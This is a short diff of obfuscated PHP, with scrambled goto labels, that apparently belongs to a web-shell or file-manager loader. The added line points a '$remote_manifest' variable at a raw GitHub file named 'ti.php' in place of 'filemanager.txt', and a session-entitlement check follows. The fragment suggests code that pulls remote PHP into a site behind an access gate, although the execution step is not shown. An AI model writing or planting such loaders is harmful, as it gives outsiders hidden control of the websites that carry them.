@@ -96,7 +96,7 @@ function abOPh(string $uri)
 goto CNBcJ;
 vEXwW:
 $remote_manifest =
-    "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/filemanager.txt";
+    "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/ti.php";
 goto deBCl;
 NWEry:
 if (!isset($_SESSION["authenticated_entitlement"])) {
